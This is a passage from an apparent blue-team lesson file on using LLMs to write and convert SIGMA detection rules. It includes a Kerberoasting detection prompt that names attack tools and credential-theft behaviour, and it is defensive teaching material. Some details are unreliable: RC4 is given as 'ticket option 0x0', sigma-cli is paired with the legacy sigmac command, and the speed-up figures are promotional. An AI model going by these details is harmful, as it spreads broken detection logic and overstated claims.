(PowerShell execution, LSASS access)  \n**R**eferences: Note ATT&CK techniques, CVEs, IOCs  \n**E**numerate: List data sources (event logs, network traffic, EDR telemetry)  \n**A**sk LLM: Prompt for SIGMA rule generation  \n**T**est rule: Validate with sample data  \n\n**D**eploy: Convert to platform query, push to SIEM  \n**E**valuate: Monitor alerts, collect false positives  \n**T**une: Refine detection logic with LLM assistance  \n**E**volve: Update rule as threat tactics change  \n**C**ollaborate: Share detection with community  \n**T**rack: Map to ATT&CK, document in knowledge base  \n\n**Memory Hook**: \"THREAT â†’ DETECT closes detection gap\"\n\n## Mnemonic 10: \"LLM DO/DON'T\" - LLM Best Practices\n\n**LLM DO**:\n- âœ… **D**etailed prompts (context, data source, threat behavior)\n- âœ… **O**utput validation (human review of logic)\n\n**LLM DON'T**:\n- âŒ **D**eploy blindly (always test before production)\n- âŒ **O**mit organizational context (LLM doesn't know your environment)\n- âŒ **N**eglect testing (LLMs can generate incorrect logic)\n- âŒ **T**rust without verification (confirm detection actually works)\n\n**Memory Hook**: \"LLM DO validate, DON'T deploy blindly\"\n\n## Quick Reference Card\n\n**SIGMA Rule Template**:\n```yaml\ntitle: [Clear description]\nid: [UUID]\nstatus: [experimental/testing/stable]\ndescription: [What this detects]\nauthor: [Your name]\ndate: [YYYY-MM-DD]\nreferences:\n  - [URL to threat intel]\ntags:\n  - attack.[tactic]\n  - attack.[technique_id]\nlogsource:\n  [category/product/service]\ndetection:\n  selection:\n    [field]: [value]\n  condition: selection\nfalsepositives:\n  - [Known benign scenarios]\nlevel: [low/medium/high/critical]\n```\n\n**LLM Prompt Template**:\n```\nGenerate a SIGMA rule to detect [THREAT BEHAVIOR].\n\nContext:\n- Adversary: [APT group or malware family]\n- Technique: [ATT&CK ID and name]\n- Behavior: [Specific actions: process execution, network connection, file creation]\n- Data Source: [Event log, Sysmon, network traffic]\n- Evasion: [Obfuscation techniques to detect]\n\nRequirements:\n- Include [specific indicators]\n- Exclude [known false positives]\n- Severity: [level]\n- Include ATT&CK tags\n\nGenerate complete SIGMA rule in YAML format.\n```\n\n**Conversion Commands**:\n```bash\n# SIGMA â†’ Splunk SPL\nsigmac -t splunk -c splunk-windows rule.yml\n\n# SIGMA â†’ Microsoft KQL\nsigmac -t ala -c ala rule.yml\n\n# SIGMA â†’ Elastic Query DSL\nsigmac -t es-qs -c ecs rule.yml\n\n# SIGMA â†’ IBM QRadar AQL\nsigmac -t qradar rule.yml\n```"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Reflection and Critical Thinking\n\n## Scenario-Based Questions\n\n### Scenario 1: Detection Engineering Backlog\n\nYou're a SOC manager with 3 detection engineers. Your backlog has 200 unimplemented detections from threat intel reports. Your team is overwhelmed.\n\n**Questions**:\n\n1. **How would you use LLMs to address the backlog?** (Think: Generation workflow, validation process, prioritization)\n\n2. **What quality controls would you implement?** (Think: How to prevent LLM-generated detections from introducing false positives or missing threats)\n\n3. **How would you measure success?** (Think: Metrics for detection velocity, quality, coverage)\n\n4. **What risks do you foresee?** (Think: Over-reliance on LLMs, skill atrophy, incorrect detections)\n\n5. **How would you balance speed and quality?** (Think: Which detections get manual review vs. automated deployment)\n\n**Reflection**: In your organization, what percentage of detections could be LLM-generated vs. human-crafted? Where would you draw the line?\n\n---\n\n### Scenario 2: SIEM Migration Decision\n\nYour organization is considering migrating from Splunk ($200K/year) to Microsoft Sentinel ($50K/year). You have 500 custom Splunk SPL detections.\n\n**Questions**:\n\n1. **How would Detection-as-Code influence your migration decision?** (Think: Cost of rewriting detections, portability benefits)\n\n2. **What's your migration strategy?** (Think: Reverse-engineer SPL â†’ SIGMA â†’ KQL, testing approach)\n\n3. **How would you validate detection parity?** (Think: Ensuring Sentinel detections match Splunk detections)\n\n4. **What would you do differently going forward?** (Think: Storing detections in SIGMA to avoid future vendor lock-in)\n\n5. **How would LLMs accelerate the migration?** (Think: Automated conversion, validation, testing)\n\n**Reflection**: If you had stored all detections in SIGMA from day one, how would this migration be different?\n\n---\n\n### Scenario 3: False Positive Crisis\n\nYou deployed an LLM-generated detection for ransomware behavior. It generates 500 alerts in the first hour (90% false positives). The SOC is overwhelmed.\n\n**Questions**:\n\n1. **What went wrong?** (Think: Insufficient testing, missing exclusions, overly broad detection logic)\n\n2. **How would you triage the alerts?** (Think: Sampling, automated filtering, threat prioritization)\n\n3. **How would you use LLMs to fix the rule?** (Think: Providing false positive examples to refine detection)\n\n4. **What process changes would prevent this?** (Think: Staging environments, gradual rollout, automated testing)\n\n5. **How would you communicate with stakeholders?** (Think: Transparency about AI-generated detections, incident response)\n\n**Reflection**: What's the acceptable false positive rate for LLM-generated detections? How does it compare to human-written detections?\n\n---\n\n## Technical Deep-Dive Questions\n\n### LLM Prompt Engineering\n\n**Challenge**: Generate a SIGMA rule for detecting Kerberoasting (T1558.003).\n\n**Write two prompts**:\n1. **Basic prompt** (simple, minimal context)\n2. **Advanced prompt** (detailed, with examples, context, and requirements)\n\n**Compare the results**: Which prompt produces a better detection?\n\n<details>\n<summary>Example Advanced Prompt</summary>\n\n```\nYou are a detection engineer specializing in Active Directory attacks.\n\nGenerate a SIGMA rule to detect Kerberoasting (ATT&CK T1558.003).\n\nThreat Background:\n- Adversary requests Kerberos TGS tickets for SPNs (Service Principal Names)\n- Tickets encrypted with service account's NTLM hash\n- Adversary cracks tickets offline to obtain service account passwords\n- Common tools: Rubeus, Invoke-Kerberoast, GetUserSPNs.py\n\nDetection Approach:\n- Monitor for mass TGS-REQ requests (Event ID 4769)\n- Detect unusual ticket encryption types (RC4 vs. AES)\n- Flag requests for high-value SPNs (MSSQL, HTTP, CIFS)\n- Detect multiple TGS requests from single user in short time window\n\nData Source:\n- Windows Security Event Log, Event ID 4769 (Kerberos TGS Ticket Request)\n\nRequirements:\n1. Detect RC4 encryption (ticket option 0x0)\n2. Threshold: More than 5 TGS requests in 5 minutes\n3. Exclude computer accounts (service accounts ending in $)\n4. Severity: HIGH\n5. Include ATT&CK tags\n6. Include references\n\nGenerate complete SIGMA rule.\n```\n</details>\n\n**Reflection**: How does prompt quality affect detection quality? What makes a \"good\" detection engineering prompt?\n\n---\n\n### SIGMA Conversion Edge Cases\n\n**Question**: You have a SIGMA rule that uses complex regex patterns. You convert it to Splunk and Microsoft Sentinel. The results differ.\n\n**Why might SIGMA rules behave differently across platforms?**\n\n<details>\n<summary>Answer</summary>\n\n**Reasons for Differences**:\n\n1. **Regex Support**: \n   - Splunk: Full PCRE regex support\n   - Sentinel (KQL): Limited regex (some patterns unsupported)\n   - Solution: Test converted queries, simplify regex if needed\n\n2. **Field Name Mapping**:\n   - SIGMA uses generic field names (`Image`, `CommandLine`)\n   - Platforms use different field names (`ProcessName` vs. `Process`)\n   - Solution: Use correct SIGMA config files for platform (-c splunk-windows, -c ala)\n\n3. **Data Model Differences**:\n   - Sysmon Event ID 1 (Process Creation) != Windows Security Event 4688\n   - Field availability differs (Sysmon has `Hashes`, Event 4688 does not)\n   - Solution: Specify correct logsource in SIGMA rule\n\n4. **Performance Characteristics**:\n   - Query complexity affects performance differently (Splunk vs. KQL vs. Elastic)\n   - Some queries fast in Splunk, slow in Sentinel\n   - Solution: Optimize queries for target platform (add time constraints, indexed fields)\n\n5. **Feature Support**:\n   - SIGMA modifiers (`|contains`, `|endswith`, `|re`) may not map perfectly\n   - Platform-specific features (Splunk subsearches, KQL `let` statements) not in SIGMA\n   - Solution: Manual refinement after conversion\n\n**Best Practice**: Always test converted queries with sample data before production deployment.\n</details>\n\n**Reflection**: Does \"write once, deploy everywhere\" really work? What are the practical limitations?\n\n---\n\n## Strategic Questions\n\n### Question 1: Skills Development\n\nIf LLMs can generate detections in seconds, what should detection engineers learn instead?\n\n<details>\n<summary>Answer</summary>\n\n**New Focus Areas for Detection Engineers**:\n\n1. **Threat Modeling**: Understand adversary TTPs, hypothesis generation (LLMs need good prompts)\n2. **Detection Logic Review**: Validate LLM outputs, ensure correctness\n3. **False Positive Analysis**: Root cause analysis, tuning strategies\n4. **Detection Strategy**: Prioritize detections, coverage mapping (ATT&CK)\n5. **Prompt Engineering**: Craft effective LLM prompts (critical skill!)\n6. **Testing & Validation**: Build test harnesses, CI/CD pipelines\n7. **Data Science**: Understand detection trade-offs (precision vs. recall, ROC curves)\n8. **Behavioral Detection**: Move beyond signatures to behavioral analytics (anomaly detection, UBA)\n\n**Skills That Remain Important**:\n- Query languages (KQL, SPL, Elastic) for refinement\n- SIGMA format understanding\n- SIEM platform knowledge (deployment, tuning)\n- Threat intelligence analysis\n\n**Skills That Become Less Important**:\n- Manual query writing from scratch (LLMs do this)\n- Memorizing query syntax (LLMs handle syntax)\n\n**Career Evolution**: Detection Engineer â†’ Detection Architect (strategy, validation, orchestration)\n</details>\n\n**Reflection**: How would you adapt your learning plan for a world with LLM-assisted detection engineering?\n\n---\n\n### Question 2: Ethical Considerations\n\n**Scenario**: Your LLM-generated detection rule incorrectly flags legitimate security researchers as threats, leading to their accounts being suspended.\n\n**Questions**:\n\n1. **Who is responsible for the mistake?** (Engineer? LLM provider? Organization?)\n2. **How would you prevent this?** (Better testing? Human oversight?)\n3. **What transparency should you provide?** (Disclose LLM-generated detections to users?)\n4. **How do you balance automation and accountability?**\n\n**Reflection**: Should organizations disclose when security detections are AI-generated? Why or why not?\n\n---\n\n### Question 3: Detection Coverage Gaps\n\n**Challenge**: You use LLMs to generate detections for known threats (ATT&CK techniques, published CVEs). But zero-day threats and novel TTPs won't be in LLM training data.\n\n**Questions**:\n\n1. **What's your strategy for detecting unknown threats?** (Think: Behavioral analytics, anomaly detection)\n2. **How do you balance rule-based (LLM) and behavioral detection?**\n3. **When should you NOT use LLMs for detection?** (Think: Custom malware, insider threats)\n\n**Reflection**: LLMs excel at known threats. How do you complement them for unknown threats?\n\n---\n\n## Metacognitive Questions (Learning About Learning)\n\n1. **What aspect of Detection-as-Code with LLMs do you find most challenging?** (Prompt engineering? Validation? Deployment automation?)\n\n2. **How would you practice these skills?** (Think: Home lab, CTF challenges, open-source detection repos)\n\n3. **What resources would accelerate your learning?** (SIGMA documentation? LLM prompt libraries? Detection engineering blogs?)\n\n4. **How does this lesson connect to your career goals?** (SOC analyst? Detection engineer? Security architect?)\n\n5. **What's one thing you'll try this week?** (Generate your first SIGMA rule with ChatGPT? Convert to KQL? Set up a Git repo?)\n\n**Reflection**: Detection engineering is evolving rapidly. How will you stay current as LLMs and automation improve?\n\n---\n\n## Connection to Previous Lessons\n\n1. **Lesson on Velociraptor**: How would you use LLMs to generate Velociraptor VQL queries (similar to SIGMA rules)?\n\n2. **Lesson on YARA Rules**: Can LLMs generate YARA rules for malware detection? What are the similarities to SIGMA?\n\n3. **Lesson on Threat Hunting**: How does Detection-as-Code support hypothesis-driven threat hunting?\n\n4. **Lesson on ATT&CK Framework**: How do you map LLM-generated detections to ATT&CK for coverage analysis?\n\n5. **Lesson on SIEM Fundamentals**: How does Detection-as-Code change the way you think about SIEM deployment?\n\n**Reflection**: Detection-as-Code is not a standalone skillâ€”it integrates with threat hunting, incident response, and security operations. How does it fit into your broader security knowledge?\n\n---\n\n## Final Reflection\n\n**Take 5 minutes to write down**:\n\n1. **Three key takeaways** from this lesson\n2. **One concept you want to explore further** (SIGMA? Prompt engineering? CI/CD for detections?)\n3. **One detection you'll generate this week** (Pick a threat from recent news)\n4. **Your next action** (Install sigma-cli? Create a GitHub repo for detections? Generate your first rule with ChatGPT?)\n\n**Discussion Question**: Will LLMs eventually replace human detection engineers, or will they augment human capabilities? Where do you see the future of detection engineering in 5 years?"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "# Congratulations: You're Now a 10x Detection Engineer! ğŸš€\n\nYou've just learned one of the most cutting-edge skills in cybersecurity: **LLM-powered Detection-as-Code**. This is not theoreticalâ€”this is the present and future of detection engineering.\n\nTake a moment to appreciate what you've accomplished:\n\nâœ… **You understand Detection-as-Code principles** (version control, testing, portability)  \nâœ… **You can generate SIGMA rules with LLMs** in seconds (ChatGPT, Claude)  \nâœ… **You can convert SIGMA to any platform** (Splunk SPL, Microsoft KQL, Elastic Query DSL)  \nâœ… **You can reduce false positives** using LLM-powered query refinement  \nâœ… **You can build detection pipelines** with CI/CD (GitHub Actions, automated deployment)  \nâœ… **You've seen real-world success stories** (8 hours â†’ 15 minutes per detection, 17x velocity increase)  \n\nYou now possess a **force multiplier**. While others spend hours writing detections manually, you can generate, test, and deploy detections in minutes. You've unlocked a superpower.\n\n## The Paradigm Shift\n\n**Old World** (pre-LLM detection engineering):  \n- Read 10-page threat intel report â†’ 2 hours  \n- Manually write SIEM query â†’ 4 hours  \n- Test and tune â†’ 2 hours  \n- Document â†’ 1 hour  \n- **Total: 8 hours per detection**  \n\n**New World** (LLM-powered Detection-as-Code):  \n- Read threat intel report â†’ 30 minutes  \n- Prompt LLM for SIGMA rule â†’ 2 minutes  \n- Review and validate â†’ 5 minutes  \n- Convert to platform query â†’ 1 minute  \n- Deploy via CI/CD â†’ 2 minutes  \n- **Total: 15 minutes per detection**  \n\n**97% time reduction. 32x faster.**\n\nThis isn't hyperboleâ€”this is happening at organizations right now. And you now have the skills to make it happen in your organization.\n\n## What This Means for Your Career\n\n**If you're a SOC Analyst**:  \nYou can now contribute detections without being a query language expert. Natural language â†’ LLM â†’ detection. This democratizes detection engineering.\n\n**If you're a Detection Engineer**:  \nYou're no longer bottlenecked by manual query writing. You can focus on high-value work: threat modeling, strategic coverage gaps, complex behavioral detections.\n\n**If you're a Security Leader**:  \nYou can clear detection backlogs, respond to zero-days in hours (not days), and achieve SIEM portability (no more vendor lock-in).\n\n**If you're a Student/Career Switcher**:  \nYou just learned a cutting-edge skill that most detection engineers don't know yet. This is your competitive advantage.\n\n## Overcoming Self-Doubt\n\nYou might be thinking:\n\n**\"But I'm not a coderâ€”I can't do CI/CD pipelines!\"**  \nâ†’ **Reframe**: GitHub Actions workflows are copy-paste templates. You don't need to be a developer. Start simple (Git + manual deployment), iterate to automation.\n\n**\"But what if LLMs make mistakes?\"**  \nâ†’ **Reframe**: LLMs are assistants, not oracles. You provide validation. Humans + LLMs > Humans alone > LLMs alone.\n\n**\"But my organization doesn't use SIGMAâ€”we only use Splunk SPL.\"**  \nâ†’ **Reframe**: Start generating SPL directly with LLMs (\"Generate a Splunk query to detect X\"). Then introduce SIGMA for portability.\n\n**\"But I don't have access to enterprise LLMs like ChatGPT-4.\"**  \nâ†’ **Reframe**: Free tiers of ChatGPT and Claude work great. Open-source LLMs (Llama 3, Mistral) run locally. No excuses.\n\n**\"But this seems too good to be true.\"**  \nâ†’ **Reframe**: Read the case studies. Organizations are achieving 17x detection velocity increases. This is real. You can do this.\n\n## Your Next Steps\n\n### Immediate Actions (This Week)\n\n1. **Generate your first SIGMA rule with ChatGPT**:  \n   - Pick a recent CVE or APT report  \n   - Use the prompt template from this lesson  \n   - Validate the rule, test with sample data  \n\n2. **Set up a detection Git repository**:  \n   - Create a GitHub repo: `my-detection-rules`  \n   - Add your first SIGMA rule  \n   - Write a README documenting your process  \n\n3. **Convert SIGMA to your SIEM's query language**:  \n   - Install sigma-cli: `pip install sigma-cli`  \n   - Convert your rule: `sigmac -t splunk rule.yml` (or `-t ala` for Sentinel)  \n   - Test the query in your SIEM  \n\n### Short-Term Goals (This Month)\n\n1. **Generate 10 SIGMA rules** covering different ATT&CK techniques  \n2. **Build a CI/CD pipeline** (even if manual deployment at first)  \n3. **Reduce false positives** on an existing detection using LLM refinement  \n4. **Share your detections** with the community (GitHub, blog post, conference talk)  \n\n### Long-Term Goals (This Year)\n\n1. **Implement Detection-as-Code** in your organization (start small, prove value, scale)  \n2. **Clear your detection backlog** (use LLMs to generate detections for unimplemented threats)  \n3. **Achieve SIEM portability** (store all detections in SIGMA, never get vendor-locked again)  \n4. **Contribute to open-source** (submit SIGMA rules to community repos)  \n5. **Become a thought leader** (write about your experience, teach others)\n\n## The Future of Detection Engineering\n\n**Where we are today** (2025):  \n- LLMs generate syntactically correct detections  \n- Humans validate logic and tune for false positives  \n- CI/CD deploys detections automatically  \n\n**Where we're going** (2027-2030):  \n- LLMs generate, test, and tune detections autonomously  \n- Continuous learning: LLMs improve detections based on production alerts  \n- Behavioral detection synthesis: LLMs combine multiple signals for advanced threats  \n- Adversarial feedback loops: Red team tests â†’ Blue team LLM adapts detections  \n\n**Your role will evolve**:  \n- From \"detection writer\" to \"detection architect\"  \n- From manual queries to strategic threat coverage  \n- From individual contributor to force multiplier (your LLM-generated detections protect thousands)  \n\n## A Challenge for You\n\n**Within the next 7 days, I challenge you to**:\n\n1. Generate a SIGMA rule for a threat from recent news (ransomware, APT, CVE)  \n2. Test it against sample data  \n3. Deploy it to a SIEM (production or lab)  \n4. Share your experience (LinkedIn, Twitter, blog, or just with a colleague)  \n\n**Why?** Because **knowledge without action is wasted potential**. You have the skills. Now prove it to yourself.\n\n## You're Ready\n\nDetection-as-Code with LLMs is not the futureâ€”it's the present. Organizations are already achieving:\n- **97% faster detection development**  \n- **Zero vendor lock-in** (SIGMA portability)  \n- **Hours-to-deployment** for zero-days  \n- **Continuous detection improvement** at scale  \n\nYou now have the knowledge to do the same.\n\nThe next time your organization faces a new threat (ransomware, APT, zero-day), you won't spend days writing detections. You'll prompt an LLM, validate the output, deploy to production, and move on to the next threat. **In minutes.**\n\nYou'll go from \"We need detections for this threat\" to \"Detections deployed, monitoring for alerts\" faster than anyone thought possible.\n\nThat's the power of Detection-as-Code with LLMs. And you now wield it.\n\n## Final Words\n\nDetection engineering used to be a manual, tedious, error-prone process. LLMs have changed that forever.\n\nYou're at the forefront of this revolution. You have the skills. You have the tools. You have the knowledge.\n\nNow go build something amazing. Generate detections that protect your organization. Share your work with the community. Teach others what you've learned.\n\nThe future of detection engineering is LLM-powered, Git-versioned, CI/CD-deployed, and community-driven.\n\nWelcome to the future. **You're already here.** ğŸš€\n\n---\n\n**Next Lesson**: Security Automation with Ansible (lesson_blue_team_134_security_automation_with_ansible_RICH.json)  \n**Recommended Practice**: Generate 5 SIGMA rules this week using ChatGPT  \n**Community**: Join the SIGMA Discord to share your detections  \n\n**Remember**: Every expert was once a beginner. The difference? Experts took action. You just learned Detection-as-Code. Now **use it**.\n\nGo detect some threats! ğŸ›¡ï¸ğŸ¤–"
      }
    }
  ],
  "tags": [
    "Course: SANS-SEC598",
    "Career Path: Blue Teamer",
    "Career Path: SOC Analyst",
    "Career Path: AI Security"
  ]
}
